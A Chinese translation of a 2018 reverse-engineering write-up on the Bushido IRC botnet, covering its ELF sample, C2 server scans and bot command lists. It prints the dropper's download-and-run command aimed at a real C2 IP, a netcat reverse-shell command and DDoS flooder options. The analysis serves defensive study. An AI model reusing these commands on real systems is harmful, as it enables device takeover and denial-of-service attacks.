> 原文链接: https://www.anquanke.com//post/id/158783 


# 逆向 Bushido IOT 僵尸网络


                                阅读量   
                                **132579**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：mien.in
                                <br>原文地址：[http://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/](http://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01652dc2c91643678b.jpg)](https://p3.ssl.qhimg.com/t01652dc2c91643678b.jpg)

这篇文章介绍一个代号为 Bushido 的僵尸网络，这个僵尸网络既可以控制 IOT 设备发动 DDOS 攻击，也可以控制 web 服务器发动 DDOS 攻击，本文介绍该恶意软件的感染行为，也会尝试分析该恶意软件背后的作者。

感谢 MalwareMustDie 提供本次分析的初始脚本，简单来说，这些脚本的功能是从服务器下载若干可执行文件然后执行他们，针对不同平台会下载对应的可执行文件，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/malware-samples.png)

在这篇文章里我们选择了64位的 ELF 样本进行逆向分析，其他平台的样本逻辑功能是一样的。



## 恶意样本

首先，列一下最后分析出来的该僵尸网路所有的文件

|FILE HASH VALUE|FILE NAME|FUNCTION
|------
|4c1ff6424e1d47921a9c3822c67b6d288e67781d22ee1bc4f82fc11509bfb479|a09rndgxtx|botnet binary
|40a9be5a72284a14939271e244a9904142c7e87e64d2b1a476b51d36c5f2de26|a88hfdje8|botnet binary
|f4bed53e2a0d273f00e82825607164ad20caa5f1a02e48e4b5627a819f49df8b|ab89484bdhd|botnet binary
|d12ffbef4d85806d77294377956c4ecc48ac9b8c3bddbf26a917723f80c719fb|adjde99vhc|botnet binary
|c1b12ad1eb4e64896a66dc9b4e83f0e3a7d2d4c79819b68853f0f64fd329ac83|adjs8993bd|botnet binary
|37ac5b9aef6955a7a393d87ee656656851c313896fdeaff3b591e68ebda7a21d|agf63683gd|botnet binary
|5a8a8ea38ac8202373474e5ce535efd2302543a5aa595aa00bd3b553467ffd34|alfkdcj9e8|botnet binary
|fd171c6b8f870bf64885cb05a5f1da3581537810652a9714a592c21889722198|alo99edgwu|botnet binary
|9bad4e105c1701c965fd65118a14e06d222ca13eb9adb3c9e1e4fd7a80374087|apr98dgs5c|botnet binary
|ca5bb4a794663f35c1ded854e5157e8d077624501514ecac329be7ada8e0248c|aqerd783nd|botnet binary
|7c492dde22c828fffc3067ef6aaa5d466cab76858079ce57492ce9bbfd7e449a|atyur7837s|botnet binary
|5fb8b5590b4845b31988f636a5a09b02bdbb3e730dd1f78d8f04a02013cb760d|ambvjcv9e0|botnet binary
|70d7adcd931eb49ede937b64f1653a6710fbcea891e2ab186165cff1d3429945|8UsA1.sh|infection script
|36f38298c5345abf9f0036890b357610078327a4a0a0e61db79fe7afb591830d|update.sh|infection script
|eabee288c9605b29f75cd23204b643cfe4d175851b7d57c3d3d73703bd0f8ec8|ftp1.sh|download the malware samples via ftp and install it
|2544f0299a5795bf12494e2cbe09701cb024b06a0b924c91de0d35efb955a5fe|pma.php|php botnet more on it in later section
|18d6a4280adf67e2adf7a89aa11faa93a5ed6fc9d64b31063386d762b92b45d3|pma.pl|pearl botnet more on it in later section



## 静态分析

64位平台的二进制文件是 ambvjcv9e0 这个文件，首先，查看它的文件信息

```
$ file ambvjcv9e0
ambvjcv9e0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

如上，这是一个64位的elf文件，接下去我们查看 elf 头信息

```
readelf -h x64_ambvjcv9e0
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400194
  Start of program headers:          64 (bytes into file)
  Start of section headers:          120288 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         3
  Size of section headers:           64 (bytes)
  Number of section headers:         15
  Section header string table index: 12
```

然后，查看 elf 文件的程序头

```
$ readelf -l ambvjcv9e0
Elf file type is EXEC (Executable file)
Entry point 0x400194
There are 3 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x000000000001b50c 0x000000000001b50c  R E    0x100000
  LOAD           0x000000000001b510 0x000000000051b510 0x000000000051b510
                 0x0000000000001418 0x00000000000094a0  RW     0x100000
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x8

 Section to Segment mapping:
  Segment Sections...
   00     .init .text .fini .rodata .eh_frame
   01     .ctors .dtors .jcr .data .bss
   02
```

如上，没有 dynamic section 和 INTERP section, 接下去我们查看详细的 section 表

```
$ readelf -S ambvjcv9e0
There are 15 section headers, starting at offset 0x1d5e0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .init             PROGBITS         00000000004000e8  000000e8
       0000000000000013  0000000000000000  AX       0     0     1
  [ 2] .text             PROGBITS         0000000000400100  00000100
       0000000000015138  0000000000000000  AX       0     0     16
  [ 3] .fini             PROGBITS         0000000000415238  00015238
       000000000000000e  0000000000000000  AX       0     0     1
  [ 4] .rodata           PROGBITS         0000000000415260  00015260
       00000000000062a6  0000000000000000   A       0     0     32
  [ 5] .eh_frame         PROGBITS         000000000041b508  0001b508
       0000000000000004  0000000000000000   A       0     0     4
  [ 6] .ctors            PROGBITS         000000000051b510  0001b510
       0000000000000010  0000000000000000  WA       0     0     8
  [ 7] .dtors            PROGBITS         000000000051b520  0001b520
       0000000000000010  0000000000000000  WA       0     0     8
  [ 8] .jcr              PROGBITS         000000000051b530  0001b530
       0000000000000008  0000000000000000  WA       0     0     8
  [ 9] .data             PROGBITS         000000000051b540  0001b540
       00000000000013e8  0000000000000000  WA       0     0     32
  [10] .bss              NOBITS           000000000051c940  0001c928
       0000000000008070  0000000000000000  WA       0     0     32
  [11] .comment          PROGBITS         0000000000000000  0001c928
       0000000000000c4e  0000000000000000           0     0     1
  [12] .shstrtab         STRTAB           0000000000000000  0001d576
       0000000000000066  0000000000000000           0     0     1
  [13] .symtab           SYMTAB           0000000000000000  0001d9a0
       0000000000005418  0000000000000018          14   290     8
  [14] .strtab           STRTAB           0000000000000000  00022db8
       00000000000029a2  0000000000000000           0     0     1
```

如上，这个elf文件是静态链接的，而且没有消除符号，所以我们可以用 readelf 读取符号表

```
$ readelf -s ambvjcv9e0
318: 000000000040bc46   485 FUNC    GLOBAL DEFAULT    2 popen
319: 0000000000407ca5   177 FUNC    GLOBAL DEFAULT    2 botkill
320: 0000000000411484   351 FUNC    GLOBAL DEFAULT    2 sysconf
322: 000000000040b7d8    15 FUNC    GLOBAL DEFAULT    2 vsprintf
323: 0000000000410ab4    72 FUNC    GLOBAL DEFAULT    2 random
324: 0000000000411ad0    19 FUNC    GLOBAL HIDDEN     2 __GI_getpagesize
325: 000000000040dd60    54 FUNC    GLOBAL HIDDEN     2 __GI_strdup
326: 000000000040b43c    35 FUNC    GLOBAL DEFAULT    2 getdtablesize
328: 0000000000405c17    33 FUNC    GLOBAL DEFAULT    2 contains_fail
329: 000000000040037f   286 FUNC    GLOBAL DEFAULT    2 Send
330: 0000000000414c50    19 FUNC    GLOBAL HIDDEN     2 __length_question
332: 000000000040877a  1608 FUNC    GLOBAL DEFAULT    2 hackpkg
333: 00000000004130c4   115 FUNC    GLOBAL DEFAULT    2 setservent
334: 000000000040dce8    48 FUNC    GLOBAL HIDDEN     2 __GI_strcasecmp
335: 0000000000411cd0    30 FUNC    GLOBAL HIDDEN     2 __GI_tolower
336: 000000000040d3a8   192 FUNC    GLOBAL DEFAULT    2 putc_unlocked
337: 000000000040fad4    11 FUNC    WEAK   DEFAULT    2 recv
338: 000000000040fa48    43 FUNC    WEAK   DEFAULT    2 connect
339: 0000000000414c00    80 FUNC    GLOBAL HIDDEN     2 __encode_question
340: 00000000004115e4    70 FUNC    GLOBAL HIDDEN     2 __GI___uClibc_fini
342: 0000000000414ab8   163 FUNC    GLOBAL HIDDEN     2 __encode_header
343: 0000000000413234   233 FUNC    GLOBAL DEFAULT    2 getservbyname_r
344: 0000000000414a40   119 FUNC    GLOBAL HIDDEN     2 __GI_strncat
345: 000000000041162a     3 FUNC    WEAK   DEFAULT    2 __pthread_mutex_lock
346: 000000000040fc98    30 FUNC    GLOBAL DEFAULT    2 __sigdelset
```

下面我们读取以 ‘.c’ 结束的符号

```
$ readelf -s x64_ambvjcv9e0 | grep -F .c
16: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
26: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
32: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS initfini.c
35: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS Bushido-IRC.c
50: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS __syscall_fcntl.c
51: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS _exit.c
52: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS close.c
53: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS fork.c
54: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getdtablesize.c
55: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getpid.c
56: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getppid.c
57: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getrlimit.c
58: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ioctl.c
59: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS kill.c
```

发现了一个有趣的文件 Bushido-IRC.c（本僵尸网络名字的来源），更有意思的是，接下去我发现不需要用反编译的手段，直接用 strings 工具就可以发现该恶意样本的很多有用信息

```
$ strings ambvjcv9e0
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://80.93.187.211/update.sh -O update.sh; busybox wget http://80.93.187.211/update.sh -O update.sh; ftpget
 -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; chmod 777 upd
ate.sh; ./update.sh; rm -rf update.sh
mirai.*
dlr.*mips
mips64
mipsel
sh2eb
sh2elf
armv5
armv4tl
armv4
armv6
i686
powerpc
```

通过浏览 strings 输出我发现了该样本的有趣信息：
1. CNC 服务器的 IP 地址
1. telnet 服务的账号和密码
1. 若干 HTTP headers 相关的字符串
1. 若干 user agent 相关的字符串
1. 大量种族主义的言论
1. 大量IRC命令和相关字符串
1. 恶意软件使用说明
1. 恶意软件更新命令和大量其他命令
1. 错误处理相关的字符串
1. libc 库函数名
1. nmap 扫描命令
1. 编译脚本的名字
通过上述字符串可以大概判断本恶意软件的功能，但是为了搞清楚其工作流程，以及如何与 CNC 服务器连接，我们需要深入分析，由于我们已经知道了 ip 地址，我们可以直接对 CNC 服务器做端口扫描



## 扫描服务器

从可执行文件里得到CNC服务器ip地址后，很自然而然就会进行端口扫描，通过扫描我得到以下结果

1，服务器A(ip 80.93.187.211)

```
21/tcp   open     ftp        
22/tcp   open     ssh          OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey:
|   1024 b3:ae:e9:79:22:65:37:15:13:66:c8:8f:0a:81:13:ec (DSA)
|_  2048 32:e9:e2:9f:9b:ae:13:e6:99:7a:60:91:9c:38:30:8d (RSA)
80/tcp   open     http         Apache httpd 2.2.15 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-title: Apache HTTP Server Test Page powered by CentOS
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
443/tcp  open     https?
445/tcp  filtered microsoft-ds
3306/tcp open     mysql        MySQL (unauthorized)
6667/tcp open     irc          UnrealIRCd
| irc-info:
|   users: 57
|   servers: 1
|   chans: 3
|   lusers: 57
|   lservers: 0
|   server: irc.NulL
|   version: Unreal3.2.10.6. irc.NulL
|   source ident: nmap
|   source host: 19A967F7.1F3B5440.6D396E3B.IP
|_  error: Closing Link: kksqfgqca[114.143.107.254] (Client has disconnected from ZullSec)
```

根据扫描结果可以得到下面的结论：
1. 这是基于 IRC 的 CNC 服务器
1. ftp 服务可能可以使用：进一步地，我使用默认ftp账号和密码（anonymous）成功登录了该ftp服务，登录了ftp服务之后，就可以得到我们前面提到的所有文件，在其中一个脚本文件 8UsA1.sh 里，我们发现它还连接了另外一个ip地址： 185.244.25.217
2， 服务器B(ip 185.244.25.217)

这个ip是从文件 8UsA1.sh 里发现的，对它进行 nmap 端口扫描，可惜没发现啥有意思的东西，它只开放了一个 HTTP 服务

```
80/tcp  open  http
443/tcp open  https
Running: Linux 2.6.X
OS details: Linux 2.6.18 - 2.6.22
```



## CNC服务器

从上述分析我得出结论，这个恶意样本是通过服务器A基于 IRC 控制的僵尸网络，使用IRC客户端链接CNC服务器后可以发现有两个频道
1. pma – 恶意脚本感染了web服务器后会通过 IRC 加入 CNC 服务器的这个频道
1. zull – 恶意二进制感染了iot设备后通过 IRC 加入 CNC 服务器的这个频道
### <a class="reference-link" name="IRC%E6%9C%8D%E5%8A%A1%E5%99%A8"></a>IRC服务器

经过分析，恶意终端连接 IRC 服务的命令格式如 “NICK[ZULL|x86_64]ZM5z”， 这个命令表示恶意样本 NICK[] 加入 IRC 频道 #zull, 使用的密码是写死在可执行文件里的，如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/botnet-credentials.png)



## 恶意终端的功能

通过分析可以知道恶意样本具备以下能力：
1. DDOS 攻击，这是主要功能，集成了多种 DDOS 攻击，如 ICMP flood, TCP/UDP flood
1. 恶意终端可以被 CNC 远程关闭，这个关闭恶意终端的命令的密码是： “FreakIsYourGod!!!”,也是写死在二进制里的，如下
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/disable-password.png)
1. 恶意终端可以从服务器下载新的可执行文件，也可以下载源码然后自己编译出可执行文件
1. 恶意终端可以跳转到新的服务器，如果当前服务器失能
逆向分析发现恶意终端二进制文件存在一个结构体数组，该结构体第一个元素是一个字符串（命令的名称），第二个元素是一个函数指针（命令的实现函数），这个数组就是指令列表，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/bot-functions.png)

小结一下，恶意终端包括运行在 IOT 设备上的可执行文件和运行在web服务器上的脚本，这些恶意终端会连接 IRC 服务器对应的频道，iot 设备的恶意终端连接 #zull 频道，web 服务器的恶意终端连接 #pma 频道，然后等待 IRC 服务器下发指令，这些指令整理如下：

### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%8B%A5%E6%9C%89%E7%9A%84%E6%8C%87%E4%BB%A4"></a>恶意可执行文件拥有的指令
- Non-root/non-spoof DDoS commands commands :
- STD: A non spoof HIV STD flooder
- HOLD: A vanilla TCP connect flooder
- JUNK: A vanilla TCP flooder (modded)
- UNKNOWN&lt;port, 0 for random&gt; &lt;packet size, 0 for random&gt;: An advanced non spoof UDP flooder modified by Freak
- HTTP: An extremely powerful HTTP flooder
- Spoof/root commands :
- UDP: A UDP flooder
- PAN: An advanced syn flooder that will kill most network drivers
- TCP: An advanced TCP flooder with multithreading. Will kill almost any service.
- PHATWONK&lt;flags/method&gt;: A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.
- BLACKNURSE: An ICMP packet flooder that will crash most firewalls and use loads of CPU.
- Other commands :
- RNDNICK : Randomizes the knights nick
- NICK: Changes the nick of the client
- SERVER: Changes servers
- GETSPOOFS : Gets the current spoofing
- SPOOFS: Changes spoofing to a subnet
- DISABLE : Disables all packeting from this client
- ENABLE : Enables all packeting from this client
- KILL : Kills the knight
- DNS2IP
- GET: Downloads a file off the web and saves it onto the hd
- UPDATE&lt;src:bin&gt; : Update this bot
- HACKPKG: HackPkg is here! Install a bin, using http, no depends!
- VERSION : Requests version of client
- KILLALL : Kills all current packeting
- HELP : Displays this
- IRC: Sends this command to the server
- SH: Executes a command
- ISH: SH, interactive, sends to channel
- SHD: Executes a psuedo-daemonized command
- GETBB: Get a proper busybox
- INSTALL &lt;http server/file_name&gt; : Download &amp; install a binary to /var/bin
- BASH: Execute commands using bash.
- BINUPDATE http:server/package : Update a binary in /var/bin via wget
- SCAN: Call the nmap wrapper script and scan with your opts.
- RSHELL: Equates to nohup nc ip port -e /bin/sh
- LOCKUP http:server : Kill telnet, d/l aes backdoor from, run that instead.
- GETSSH http:server/dropbearmulti : D/l, install, configure and start dropbear on port 30022.
### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%8B%A5%E6%9C%89%E7%9A%84%E6%8C%87%E4%BB%A4"></a>恶意脚本拥有的指令
- mail [to] [from] [subject] [message]
- dns [host]
- rndnick
- raw [irc] [data]
- uname
- eval [php] [code]
- exec [command] [args]
- cmd [command] [args]
- udpflood [ip] [port] [time] [packet] [size]
- tcpconn [host] [port] [time]
- slowread [host] [port] [page] [sockets] [time]
- slowloris [host] [time]
- l7 method [host] [time]
- post [host] time
- head [host] [time]
- tcpflood [host] [port] [time]
- httpflood [host] [port] [time] [method] [url]
- proxyhttpflood [targetUrl(with http://)] [proxyListUrl] [time] [method]
- cloudflareflood [host] [port] [time] [method] [url] [postFields]
- ud.server [host] [port] [pass] [chan]


## 恶意样本背后的人

当我们连接上 IRC 服务器的时候会发现如下信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/irc-botnet.png)

我在 twitter 上搜索以上关键字，结果发现了两个账号
1. [m4licious](https://twitter.com/m4licious_0sec)
1. [M1rOx](https://twitter.com/M1r0x__)
这些账号属于某个称为 Offsecurity 的组织，我猜测他们试图将这个僵尸网络出售，通过一点谷歌搜索我发现了更多信息：
1. [Twitter](https://twitter.com/zullsec)
1. [facebook](https://www.facebook.com/ZullSec)
1. [youtube](https://www.youtube.com/watch?v=l2m-i0pmC9w)


## 结论

这个恶意软件并没有新奇的行为，我猜测它是根据开源工具 Mirai 改的，他们通过控制web服务器和 iot 设备发动 DDOS 攻击，并通过 IRC 服务器控制所以恶意终端。
